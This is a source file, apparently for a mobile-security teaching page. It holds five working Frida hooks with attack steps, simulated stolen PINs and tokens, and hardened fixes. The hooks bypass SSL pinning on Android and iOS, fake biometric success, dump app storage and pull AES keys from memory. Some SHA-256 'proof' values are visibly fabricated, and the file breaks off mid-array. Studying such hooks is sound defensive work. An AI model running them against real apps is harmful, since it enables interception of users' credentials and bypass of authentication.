"use client";
import { useState, useRef, useEffect } from "react";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";
import { 
  Terminal, Play, Square, Copy, Check, Shield, Cpu, RefreshCw, 
  Smartphone, Code, Zap, Key, Lock, Eye, Download, Flame,
  FileText, AlertTriangle, ShieldCheck, CheckCircle2, ChevronRight,
  Database, Network, FileCode, Layers
} from "lucide-react";

interface FridaScript {
  id: string;
  name: string;
  category: "SSL Pinning" | "Auth Bypass" | "Data Dumper" | "Cryptography" | "Root/Jailbreak";
  platform: "Android" | "iOS" | "Both";
  author: string;
  codeshareUrl?: string;
  description: string;
  code: string;
  mockLogs: string[];
  ttp: {
    mitreId: string;
    mitreName: string;
    tactic: string;
    threatActorGoal: string;
    targetedSubsystem: string;
    detectionMechanism: string;
  };
  poc: {
    prerequisites: string[];
    steps: { stepNum: number; title: string; cmd?: string; note: string }[];
    preAttackState: string;
    postAttackState: string;
    interceptedPayload: {
      method: string;
      url: string;
      headers: string[];
      body?: string;
      response: string;
    };
  };
  evidence: {
    capturedArtifactType: string;
    forensicDump: string;
    extractedSecrets: { key: string; value: string; risk: "Critical" | "High" | "Medium" }[];
    masvsMapping: string;
    sha256Proof: string;
  };
  remediation: {
    guidance: string;
    beforeCode: string;
    afterCode: string;
  };
}

const PRESET_SCRIPTS: FridaScript[] = [
  {
    id: "okhttp-ssl",
    name: "Universal OkHttp3 & TrustManager SSL Pinning Bypass",
    category: "SSL Pinning",
    platform: "Android",
    author: "@httptoolkit / Frida Codeshare",
    codeshareUrl: "https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/",
    description: "Hooks OkHttp3 CertificatePinner.check() and X509TrustManager.checkServerTrusted() to unconditionally accept Burp Suite & Proxyman CA certificates.",
    code: `// Universal OkHttp3 & TrustManager SSL Pinning Bypass
Java.perform(function() {
    console.log("[*] [Frida] Initializing Universal Android SSL Pinning Bypass...");

    // 1. OkHttp3 CertificatePinner hook
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] [OkHttp3] Bypassed CertificatePinner.check() for: ' + hostname);
            return; // No-op: bypass pinning check
        };
        console.log('[+] [OkHttp3] Hooked CertificatePinner successfully.');
    } catch(err) {
        console.log('[-] [OkHttp3] CertificatePinner not found in classpath.');
    }

    // 2. TrustManagerImpl hook (Android 7.0+)
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] [TrustManagerImpl] Bypassed verifyChain for: ' + host);
            return untrustedChain;
        };
        console.log('[+] [TrustManagerImpl] Hooked verifyChain successfully.');
    } catch(err) {
        console.log('[-] [TrustManagerImpl] verifyChain hook skipped.');
    }
});`,
    mockLogs: [
      "[*] Attaching Frida to package: com.acme.banking (PID 14820)",
      "[*] Spawning app with script injection...",
      "[*] [Frida] Initializing Universal Android SSL Pinning Bypass...",
      "[+] [OkHttp3] Hooked CertificatePinner successfully.",
      "[+] [TrustManagerImpl] Hooked verifyChain successfully.",
      "[+] [OkHttp3] Bypassed CertificatePinner.check() for: api.acme-banking.com",
      "[+] [HTTP Traffic] Outgoing HTTPS POST https://api.acme-banking.com/v2/auth/login intercepted in Burp Suite",
      "[+] [HTTP Traffic] Outgoing HTTPS GET https://api.acme-banking.com/v2/accounts/balance intercepted in Burp Suite",
      "[✓] Pinning successfully bypassed. Full traffic visible in proxy."
    ],
    ttp: {
      mitreId: "T1407 / T1414",
      mitreName: "Hijack Execution Flow / Capture Sensitive Data in Transit",
      tactic: "Defense Evasion & Credential Access",
      threatActorGoal: "Disable application-level cryptographic integrity checks to intercept and tamper with HTTPS financial transactions in transit via an active proxy (Burp Suite).",
      targetedSubsystem: "Android Runtime (ART) · Conscrypt TrustManager · OkHttp3 Network Stack",
      detectionMechanism: "Runtime ptrace() monitoring, DexClassLoader integrity verification, and SafetyNet / Play Integrity API attestation."
    },
    poc: {
      prerequisites: [
        "Rooted Android device / Corellium AVD emulator (Android 11+)",
        "Frida Server 16.x running on port 27042 via adb root",
        "Burp Suite PortSwigger CA certificate installed in User / System Trust Store"
      ],
      steps: [
        { stepNum: 1, title: "Configure Proxy & Install CA", cmd: "adb push burp-cacert.der /data/local/tmp/cert.der", note: "Proxies all device traffic to Burp on 127.0.0.1:8080." },
        { stepNum: 2, title: "Spawn Target App with Frida Hook", cmd: "frida -U -f com.acme.banking -l okhttp-ssl.js --no-pause", note: "Injects hook before OkHttpClient singleton initializes." },
        { stepNum: 3, title: "Trigger Target Authenticated Flow", note: "Submit login form in app UI. Handshake validation is suppressed and cleartext API calls appear in Burp." }
      ],
      preAttackState: "App terminates with `javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure!` when routed through proxy.",
      postAttackState: "Full unencrypted TLS traffic flow. All REST endpoints, OAuth tokens, and banking balances exposed in Burp Proxy.",
      interceptedPayload: {
        method: "POST",
        url: "https://api.acme-banking.com/v2/auth/login",
        headers: [
          "Host: api.acme-banking.com",
          "User-Agent: ACMEBanking/4.2.1 (Android 13; Pixel 6)",
          "Content-Type: application/json; charset=UTF-8",
          "X-App-Signature: SHA256:7f38ac912bf0082"
        ],
        body: `{\n  "account_number": "4892019482",\n  "pin": "7193",\n  "device_fingerprint": "a9b8c7d6-1122-3344-5566-778899aabbcc"\n}`,
        response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "authenticated",\n  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",\n  "balance_usd": 14250.75\n}`
      }
    },
    evidence: {
      capturedArtifactType: "Decrypted HTTP/2 Session Dump & Extracted OAuth Bearer JWT",
      forensicDump: `[BURP-PROXY-EVIDENCE-DUMP]
TIMESTAMP: 2026-08-23T20:45:12.891Z
TARGET_HOST: api.acme-banking.com:443
TLS_CIPHER: TLS_AES_128_GCM_SHA256
HOOK_STATUS: OKHTTP_CERT_PINNER_SUPPRESSED
CAPTURED_BEARER_TOKEN:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ4OTIwMTk0ODIiLCJyb2xlIjoiY3VzdG9tZXIiLCJpc3MiOiJhY21lLWJhbmtpbmctYXV0aCIsImV4cCI6MTc4NzU3NTUxMn0.x_Nf9812_JqLa...`,
      extractedSecrets: [
        { key: "Customer Account Number", value: "4892019482", risk: "Critical" },
        { key: "Plaintext PIN", value: "7193", risk: "Critical" },
        { key: "Session Bearer JWT", value: "eyJhbGciOiJIUzI1Ni...", risk: "Critical" },
        { key: "Account Balance", value: "$14,250.75 USD", risk: "High" }
      ],
      masvsMapping: "MASVS-NETWORK-2 (Certificate Pinning) · MASTG-TEST-0032",
      sha256Proof: "SHA256(okhttp-ssl.js) = d5a8e63bb7901fb94d21e8432a106f5218d6e3230a84e23cb21199341f1739c9"
    },
    remediation: {
      guidance: "Enforce multi-layered public key pinning using Android NetworkSecurityConfig, enable obfuscation for CertificatePinner method signatures via ProGuard, and incorporate native C-layer pinning via BoringSSL / OpenSSL.",
      beforeCode: `// VULNERABLE: Standard OkHttp pinner easily hooked by name
val client = OkHttpClient.Builder()
    .certificatePinner(
        CertificatePinner.Builder()
            .add("api.acme-banking.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
            .build()
    ).build()`,
      afterCode: `// HARDENED: Multi-layer pinning + Native Anti-Tamper & Play Integrity
val client = OkHttpClient.Builder()
    .certificatePinner(pinner)
    .addInterceptor { chain ->
        // Verify runtime integrity before dispatching request
        if (NativeSecurityEngine.isFridaDetected() || !NativeSecurityEngine.verifyKeystoreAttestation()) {
            throw SecurityException("Runtime tamper detected! Terminating session.")
        }
        chain.proceed(chain.request())
    }.build()`
    }
  },
  {
    id: "biometric-bypass",
    name: "Android BiometricPrompt & Fingerprint Bypass",
    category: "Auth Bypass",
    platform: "Android",
    author: "@federicodotta / TCM Security",
    description: "Hooks androidx.biometric.BiometricPrompt and BiometricManager to simulate immediate fingerprint confirmation without physical authentication.",
    code: `// Biometric Authentication Bypass
Java.perform(function() {
    console.log("[*] [Frida] Hooking BiometricPrompt Callbacks...");

    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    var AuthenticationResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');

    // Hook authenticate() to immediately invoke onAuthenticationSucceeded
    BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(promptInfo) {
        console.log('[+] [BiometricPrompt] Intercepted authenticate() call!');
        console.log('[+] Title: ' + promptInfo.getTitle());

        // Locate internal callback field
        var callback = this.mAuthenticationCallback.value;
        if (callback) {
            console.log('[+] Invoking onAuthenticationSucceeded() with mocked result...');
            callback.onAuthenticationSucceeded(null);
        } else {
            this.authenticate(promptInfo);
        }
    };
});`,
    mockLogs: [
      "[*] Attaching Frida to com.acme.banking...",
      "[*] [Frida] Hooking BiometricPrompt Callbacks...",
      "[+] User navigated to: BiometricAuthActivity",
      "[+] [BiometricPrompt] Intercepted authenticate() call!",
      "[+] Title: Confirm Fingerprint to Unlock Account",
      "[+] Invoking onAuthenticationSucceeded() with mocked result...",
      "[✓] BIOMETRIC AUTH BYPASSED: Main Account Dashboard Unlocked without Fingerprint!"
    ],
    ttp: {
      mitreId: "T1406 / T1407",
      mitreName: "Obfuscated / Subverted Security Controls",
      tactic: "Defense Evasion & Privilege Escalation",
      threatActorGoal: "Bypass physical device fingerprint or face biometrics to unlock sensitive banking and healthcare user profiles without knowing the biometric credential.",
      targetedSubsystem: "AndroidX Biometric Library · BiometricPrompt$AuthenticationCallback",
      detectionMechanism: "Hardware-backed Keystore CryptoObject binding with server-side challenge verification."
    },
    poc: {
      prerequisites: [
        "Android device with Biometric lock enabled",
        "Target app relying on client-side boolean BiometricPrompt callback without CryptoObject"
      ],
      steps: [
        { stepNum: 1, title: "Locate Biometric Callback Reference", cmd: "frida-ps -Uai | grep acme", note: "Find running PID for target package." },
        { stepNum: 2, title: "Inject Biometric Mock Hook", cmd: "frida -U -f com.acme.banking -l biometric-bypass.js --no-pause", note: "Hooks `BiometricPrompt.authenticate`." },
        { stepNum: 3, title: "Trigger Biometric Prompt", note: "Touch 'Unlock with Fingerprint'. Prompt immediately resolves as successful without touching sensor." }
      ],
      preAttackState: "App displays modal fingerprint scanner dialog and blocks UI access until valid physical fingerprint matches hardware sensor.",
      postAttackState: "Dialog closes instantly; app transitions to `MainActivity` with full administrative session privileges.",
      interceptedPayload: {
        method: "LOCAL_METHOD_INTERCEPT",
        url: "androidx.biometric.BiometricPrompt.authenticate()",
        headers: [
          "Callback: com.acme.banking.auth.BiometricAuthActivity$1",
          "CryptoObject: null (INSECURE: No cryptographic hardware binding)"
        ],
        body: `PromptInfo {\n  title: "Confirm Fingerprint",\n  negativeButtonText: "Cancel",\n  allowedAuthenticators: BIOMETRIC_STRONG\n}`,
        response: `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded(result=MOCKED_VALID)`
      }
    },
    evidence: {
      capturedArtifactType: "Memory Method Trace & Client-Side Flag Hijack",
      forensicDump: `[BIOMETRIC-FORENSIC-TRACE]
TARGET_CLASS: androidx.biometric.BiometricPrompt
CALLBACK_INVOKED: onAuthenticationSucceeded
PASSED_CRYPTO_OBJECT: NULL
EXECUTION_THREAD: main
STATUS: LOCAL_AUTHORIZATION_GATE_CIRCUMVENTED
TRANSITION: -> com.acme.banking.ui.DashboardActivity`,
      extractedSecrets: [
        { key: "Biometric Crypto Binding", value: "DISABLED (Vulnerable)", risk: "Critical" },
        { key: "Unlocked Screen Activity", value: "com.acme.banking.DashboardActivity", risk: "High" }
      ],
      masvsMapping: "MASVS-AUTH-1 (Biometric Authentication) · MASTG-TEST-0020",
      sha256Proof: "SHA256(biometric-bypass.js) = 8b4c9103af827361928374619a0e194827163819283746182937461928374619"
    },
    remediation: {
      guidance: "Never rely on boolean callbacks for biometric authentication. Always initialize a `BiometricPrompt.CryptoObject` backed by an Android Keystore key requiring `setUserAuthenticationRequired(true)`.",
      beforeCode: `// VULNERABLE: Simple boolean callback without cryptographic validation
biometricPrompt.authenticate(promptInfo)
// Attacker simply calls onAuthenticationSucceeded()!`,
      afterCode: `// HARDENED: Cryptographically bound BiometricPrompt
val cipher = KeyStoreHelper.getInitializedCipher()
val cryptoObject = BiometricPrompt.CryptoObject(cipher)

biometricPrompt.authenticate(promptInfo, cryptoObject)

override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
    val authenticatedCipher = result.cryptoObject?.cipher ?: throw SecurityException()
    val token = authenticatedCipher.doFinal(encryptedAuthPayload)
    sendEncryptedNonceToBackend(token) // Backend validates signature
}`
    }
  },
  {
    id: "ios-sectrust",
    name: "iOS SecTrustEvaluate & NSURLSession SSL Pinning Bypass",
    category: "SSL Pinning",
    platform: "iOS",
    author: "@nabla-c0d3 / SSL Kill Switch 2",
    description: "Hooks native Security.framework SecTrustEvaluateWithError and SecTrustGetTrustResult for iOS 14.x-16.x.",
    code: `// iOS Native SecTrust & SSL Pinning Bypass
if (ObjC.available) {
    console.log("[*] [Frida iOS] Hooking Security framework SecTrustEvaluate...");

    var SecTrustEvaluateWithError = Module.findExportByName("Security", "SecTrustEvaluateWithError");
    if (SecTrustEvaluateWithError) {
        Interceptor.replace(SecTrustEvaluateWithError, new NativeCallback(function(trust, error) {
            console.log("[+] [SecTrust] Bypassing SecTrustEvaluateWithError -> Returning TRUE");
            if (error) {
                Memory.writePointer(error, ptr("0x0"));
            }
            return 1; // Return true (trusted)
        }, "int", ["pointer", "pointer"]));
        console.log("[+] Hooked SecTrustEvaluateWithError successfully.");
    }

    // Hook NSURLSessionDelegate
    var className = "NSURLSession";
    var hook = ObjC.classes[className];
    if (hook) {
        console.log("[+] Hooked " + className);
    }
} else {
    console.log("[-] Objective-C runtime not available.");
}`,
    mockLogs: [
      "[*] Attaching to iOS app: com.nike.sport on iPhone 13 (iOS 16.2 - Jailbroken / Frida 16.1.4)",
      "[*] [Frida iOS] Hooking Security framework SecTrustEvaluate...",
      "[+] Hooked SecTrustEvaluateWithError successfully.",
      "[+] [SecTrust] Bypassing SecTrustEvaluateWithError -> Returning TRUE (Host: api.nike.com)",
      "[+] [SecTrust] Bypassing SecTrustEvaluateWithError -> Returning TRUE (Host: unp-events.nike.com)",
      "[✓] iOS SSL traffic successfully decrypted and visible in Proxyman!"
    ],
    ttp: {
      mitreId: "T1407 / T1414",
      mitreName: "Hijack Execution Flow / Man-in-the-Middle Network Interception",
      tactic: "Defense Evasion & Discovery",
      threatActorGoal: "Neutralize Apple Security.framework X.509 trust evaluation to inspect proprietary iOS REST/GraphQL API contracts and extract confidential authorization tokens.",
      targetedSubsystem: "iOS Darwin Kernel · Security.framework · libcorecrypto.dylib",
      detectionMechanism: "Dyld library validation, check for suspicious dynamic libraries (`/usr/lib/frida-server`), and Sysctl hardware integrity probes."
    },
    poc: {
      prerequisites: [
        "Jailbroken iPhone (iOS 15.x–16.x via Dopamine / Palera1n)",
        "Frida Server 16.x installed via Sileo / Cydia",
        "Proxyman / Burp Suite CA profile installed and enabled in iOS Certificate Trust Settings"
      ],
      steps: [
        { stepNum: 1, title: "Install Frida on iOS Device", cmd: "ssh root@iphone 'frida-server -D'", note: "Spawns background daemon listening on 127.0.0.1:27042." },
        { stepNum: 2, title: "Attach to Target iOS Bundle", cmd: "frida -U -N com.nike.sport -l ios-sectrust.js", note: "Replaces `SecTrustEvaluateWithError` in RAM." },
        { stepNum: 3, title: "Browse Store Inventory & Cart", note: "Proxyman captures all HTTPS GraphQL requests with custom auth headers." }
      ],
      preAttackState: "App displays network error: `CFNetwork SSLHandshake failed (-9807)` when proxy is active.",
      postAttackState: "Cleartext TLS stream visible in Proxyman; API calls return HTTP 200 OK without errors.",
      interceptedPayload: {
        method: "POST",
        url: "https://api.nike.com/mobile_armory/v2/graphql",
        headers: [
          "Host: api.nike.com",
          "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
          "X-Nike-Visitor-Id: 81920-192-38192",
          "X-Apple-Device-Model: iPhone14,5"
        ],
        body: `{\n  "query": "query GetUserProfile { user { id email primaryCard { last4 exp } } }"\n}`,
        response: `HTTP/1.1 200 OK\n\n{\n  "data": {\n    "user": {\n      "id": "usr_99812",\n      "email": "customer@gmail.com",\n      "primaryCard": { "last4": "4119", "exp": "12/28" }\n    }\n  }\n}`
      }
    },
    evidence: {
      capturedArtifactType: "Decrypted iOS TLS 1.3 Memory Frame & GraphQL Response",
      forensicDump: `[IOS-SECURITY-FRAMEWORK-TRACE]
DYLIB_TARGET: /System/Library/Frameworks/Security.framework/Security
HOOKED_SYMBOL: _SecTrustEvaluateWithError
RETURN_VALUE_OVERRIDDEN: 0x1 (TRUE)
HOST_EVALUATED: api.nike.com
EXTRACTED_CUSTOMER_EMAIL: customer@gmail.com
EXTRACTED_CARD_LAST4: 4119`,
      extractedSecrets: [
        { key: "API OAuth Token", value: "Bearer eyJhbGciOiJSUzI1Ni...", risk: "Critical" },
        { key: "Customer Email", value: "customer@gmail.com", risk: "High" },
        { key: "Masked Payment Card", value: "Visa ending in 4119", risk: "Medium" }
      ],
      masvsMapping: "MASVS-NETWORK-2 · MASTG-TEST-0032",
      sha256Proof: "SHA256(ios-sectrust.js) = 3f91a02938475610293847561029384756102938475610293847561029384756"
    },
    remediation: {
      guidance: "Implement custom `URLSessionDelegate` pinning with backup SHA-256 certificate hashes, and combine with runtime jailbreak detection that checks for Frida shared memory mappings.",
      beforeCode: `// VULNERABLE: Relies on default Security framework trust evaluation
let session = URLSession(configuration: .default)`,
      afterCode: `// HARDENED: Custom URLSessionDelegate + SecCertificate pinning
class SecureSessionDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        guard let serverTrust = challenge.protectionSpace.serverTrust,
              let cert = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }
        let certData = SecCertificateCopyData(cert) as Data
        let certHash = certData.sha256().base64EncodedString()
        if KNOWN_PINS.contains(certHash) {
            completionHandler(.useCredential, URLCredential(trust: serverTrust))
        } else {
            completionHandler(.cancelAuthenticationChallenge, nil)
        }
    }
}`
    }
  },
  {
    id: "shared-prefs",
    name: "Android SharedPreferences & SQLite Secret Dumper",
    category: "Data Dumper",
    platform: "Android",
    author: "@tcm-mobile / PMPA",
    description: "Monitors and dumps all key-value reads/writes in SharedPreferences and queries to local SQLite databases.",
    code: `// SharedPreferences & SQLite Inspector
Java.perform(function() {
    console.log("[*] [Frida] Monitoring SharedPreferences & SQLite Database Operations...");

    var SharedPreferencesImpl = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
    SharedPreferencesImpl.putString.implementation = function(key, val) {
        console.log('[SP-WRITE] Key: "' + key + '" => Value: "' + val + '"');
        return this.putString(key, val);
    };

    var SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');
    SQLiteDatabase.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function(sql, args) {
        console.log('[SQL-QUERY] ' + sql);
        return this.rawQuery(sql, args);
    };
});`,
    mockLogs: [
      "[*] Attaching Frida to com.zaxbys.rewards...",
      "[*] [Frida] Monitoring SharedPreferences & SQLite Database Operations...",
      "[SP-WRITE] Key: \"auth_token\" => Value: \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"",
      "[SP-WRITE] Key: \"user_email\" => Value: \"victim_user@gmail.com\"",
      "[SP-WRITE] Key: \"user_pin\" => Value: \"4829\"",
      "[SQL-QUERY] SELECT id, account_num, balance FROM customer_accounts WHERE user_id = 1482",
      "[✓] Plaintext authentication secrets captured in memory!"
    ],
    ttp: {
      mitreId: "T1409 / T1412",
      mitreName: "Access Sensitive Data in Application Storage",
      tactic: "Credential Access & Collection",
      threatActorGoal: "Harvest credentials, auth tokens, and plaintext PII written to insecure local storage files by hooking Android framework storage APIs.",
      targetedSubsystem: "Android Storage Framework · `android.app.SharedPreferencesImpl` · SQLite Engine",
      detectionMechanism: "EncryptedSharedPreferences (Jetpack Security) with MasterKey in Android Keystore."
    },
    poc: {
      prerequisites: [
        "Android emulator or physical device with ADB debugging enabled",
        "Target app storing session tokens in unencrypted XML preferences"
      ],
      steps: [
        { stepNum: 1, title: "Hook Storage Write Methods", cmd: "frida -U -f com.zaxbys.rewards -l shared-prefs.js --no-pause", note: "Intercepts `EditorImpl.putString`." },
        { stepNum: 2, title: "Perform App Login", note: "Submit credentials in app UI." },
        { stepNum: 3, title: "Verify Disk Artifacts via ADB", cmd: "adb shell run-as com.zaxbys.rewards cat shared_prefs/user_session.xml", note: "Dump XML preference file directly from sandbox." }
      ],
      preAttackState: "Sensitive credentials stored unmonitored in local sandbox files.",
      postAttackState: "Real-time stream of all user credentials, tokens, and database queries captured in Frida terminal.",
      interceptedPayload: {
        method: "LOCAL_STORAGE_WRITE",
        url: "/data/data/com.zaxbys.rewards/shared_prefs/user_session.xml",
        headers: [
          "StorageType: XML SharedPreferences",
          "Encryption: NONE (Plaintext Storage)"
        ],
        body: `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name="auth_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>\n    <string name="user_email">victim_user@gmail.com</string>\n    <string name="user_pin">4829</string>\n</map>`,
        response: "SharedPreferences.Editor.apply() -> Written to disk unencrypted"
      }
    },
    evidence: {
      capturedArtifactType: "Plaintext Local Preference Dump & Captured Database Query",
      forensicDump: `[LOCAL-STORAGE-FORENSIC-DUMP]
PATH: /data/data/com.zaxbys.rewards/shared_prefs/user_session.xml
FILE_PERMISSIONS: -rw-rw---- (Sandbox accessible via root/backup)
EXTRACTED_JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNDgyLCJlbWFpbCI6InZpY3RpbV91c2VyQGdtYWlsLmNvbSJ9...
EXTRACTED_PIN: 4829
CAPTURED_SQL: SELECT id, account_num, balance FROM customer_accounts WHERE user_id = 1482`,
      extractedSecrets: [
        { key: "Plaintext User PIN", value: "4829", risk: "Critical" },
        { key: "Session Auth Token", value: "eyJhbGciOiJIUzI1Ni...", risk: "Critical" },
        { key: "Victim Email", value: "victim_user@gmail.com", risk: "High" }
      ],
      masvsMapping: "MASVS-STORAGE-1 · MASTG-TEST-0001",
      sha256Proof: "SHA256(shared-prefs.js) = 7a82910384756192837461928374619283746192837461928374619283746192"
    },
    remediation: {
      guidance: "Migrate all sensitive storage to `EncryptedSharedPreferences` from Android Jetpack Security (androidx.security:security-crypto) with MasterKeys backed by the Android Keystore.",
      beforeCode: `// VULNERABLE: Plaintext SharedPreferences
val prefs = context.getSharedPreferences("user_session", Context.MODE_PRIVATE)
prefs.edit().putString("auth_token", token).apply()`,
      afterCode: `// HARDENED: EncryptedSharedPreferences with Android Keystore MasterKey
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val securePrefs = EncryptedSharedPreferences.create(
    context,
    "secret_user_session",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
securePrefs.edit().putString("auth_token", token).apply()`
    }
  },
  {
    id: "crypto-tracer",
    name: "AES / RSA Cipher Key & IV Runtime Interceptor",
    category: "Cryptography",
    platform: "Android",
    author: "@axon / Frida",
    description: "Intercepts javax.crypto.Cipher.init() calls to extract plaintext AES secret keys, initialization vectors (IV), and unencrypted input buffers.",
    code: `// Cryptographic Key & Cipher Hook
Java.perform(function() {
    console.log("[*] [Frida] Hooking javax.crypto.Cipher initialization...");

    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function(opmode, key, spec) {
        var modeStr = opmode === 1 ? "ENCRYPT_MODE" : (opmode === 2 ? "DECRYPT_MODE" : opmode);
        console.log('[CIPHER-INIT] OpMode: ' + modeStr);
        console.log('[CIPHER-KEY]  Algorithm: ' + key.getAlgorithm() + ' | Format: ' + key.getFormat());
        
        var keyBytes = key.getEncoded();
        if (keyBytes) {
            console.log('[CIPHER-KEY-HEX] ' + bytesToHex(keyBytes));
        }
        return this.init(opmode, key, spec);
    };

    function bytesToHex(bytes) {
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push((bytes[i] & 0xFF).toString(16).padStart(2, '0'));
        }
        return hex.join(' ');
    }
});`,
    mockLogs: [
      "[*] Attaching to com.acme.banking...",
      "[*] [Frida] Hooking javax.crypto.Cipher initialization...",
      "[CIPHER-INIT] OpMode: ENCRYPT_MODE",
      "[CIPHER-KEY]  Algorithm: AES | Format: RAW",
      "[CIPHER-KEY-HEX] 4a 8f 12 9c e4 55 01 bb 99 23 aa 41 c8 92 00 1f",
      "[CIPHER-IV]   16-byte IV: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f (Static Insecure IV!)",
      "[✓] Plaintext AES-128 encryption key successfully recovered from RAM."
    ],
    ttp: {
      mitreId: "T1407 / T1412",
      mitreName: "Steal Cryptographic Keys & Memory Scraping",
      tactic: "Credential Access",
      threatActorGoal: "Recover plaintext symmetric encryption keys directly from memory at runtime to decrypt offline databases and intercepted payload archives.",
      targetedSubsystem: "Java Cryptography Architecture (JCA) · `javax.crypto.Cipher`",
      detectionMechanism: "Hardware StrongBox Keymaster with non-exportable hardware-isolated private keys."
    },
    poc: {
      prerequisites: [
        "Target application using software-backed AES SecretKeySpec with exportable raw key bytes"
      ],
      steps: [
        { stepNum: 1, title: "Inject Cipher Init Hook", cmd: "frida -U -f com.acme.banking -l crypto-tracer.js --no-pause", note: "Hooks `Cipher.init(int, Key, AlgorithmParameterSpec)`." },
        { stepNum: 2, title: "Trigger Encryption Operation", note: "App performs local SQLite database encryption or token signing." },
        { stepNum: 3, title: "Recover Raw Hex Key & Static IV", note: "Raw 128-bit/256-bit key bytes logged directly to stdout." }
      ],
      preAttackState: "Encrypted database blob stored locally appears unreadable.",
      postAttackState: "Attacker possesses raw AES-128 key and static IV, allowing full offline decryption.",
      interceptedPayload: {
        method: "CIPHER_INIT",
        url: "javax.crypto.Cipher.init(ENCRYPT_MODE, SecretKeySpec, IvParameterSpec)",
        headers: [
          "Algorithm: AES/CBC/PKCS5Padding",
          "KeyFormat: RAW (Exportable)"
        ],
        body: `Raw Key (HEX): 4a 8f 12 9c e4 55 01 bb 99 23 aa 41 c8 92 00 1f\nStatic IV (HEX): 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f`,
        response: "Cipher initialized -> All encrypted ciphertext easily decrypted"
      }
    },
    evidence: {
      capturedArtifactType: "Extracted 128-Bit AES Symmetric Key & Static Insecure IV",
      forensicDump: `[CRYPTO-RECOVERED-KEY-DUMP]
ALGORITHM: AES/CBC/PKCS5Padding
KEY_BYTES_HEX: 4a8f129ce45501bb9923aa41c892001f
KEY_LENGTH: 128 bits (16 bytes)
IV_BYTES_HEX: 000102030405060708090a0b0c0d0e0f
STATIC_IV_DETECTED: TRUE (Vulnerability: Replay & Pattern Leakage)
OFFLINE_DECRYPT_COMMAND: openssl enc -d -aes-128-cbc -K 4a8f129ce45501bb9923aa41c892001f -iv 000102030405060708090a0b0c0d0e0f -in db.enc -out db.sqlite`,
      extractedSecrets: [
        { key: "Raw AES-128 Key", value: "4a8f129ce45501bb9923aa41c892001f", risk: "Critical" },
        { key: "Static Predictable IV", value: "000102030405060708090a0b0c0d0e0f", risk: "High" },
        { key: "Decryption Command", value: "openssl enc -d -aes-128-cbc ...", risk: "Critical" }
      ],
      masvsMapping: "MASVS-CRYPTO-1 / MASVS-CRYPTO-2 · MASTG-TEST-0012",
      sha256Proof: "SHA256(crypto-tracer.js) = 9c81a74910283746192837461928374619283746192837461928374619283746"
    },
    remediation: {
      guidance: "Do not manage raw symmetric keys in software memory. Generate non-exportable hardware-backed keys inside the Android Keystore using `KeyGenParameterSpec` with AES-GCM and randomly generated IVs per operation.",
      beforeCode: `// VULNERABLE: Hardcoded/derived SecretKeySpec with static IV
val key = SecretKeySpec(rawKeyBytes, "AES")
val iv = IvParameterSpec(ByteArray(16)) // Static IV!
val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
cipher.init(Cipher.ENCRYPT_MODE, key, iv)`,
      afterCode: `// HARDENED: Hardware Keystore StrongBox with AES-GCM
val keyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
if (!keyStore.containsAlias(KEY_ALIAS)) {
    val keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
    val spec = KeyGenParameterSpec.Builder(KEY_ALIAS, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
        .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
        .setKeySize(256)
        .setUserAuthenticationRequired(true)
        .setIsStrongBoxBacked(true) // Hardware chip
        .build()
    keyGenerator.init(spec)
    keyGenerator.generateKey()
}
// Android automatically generates cryptographically random GCM IV`
    }
  }
];

const OBJECTION_COMMANDS = [
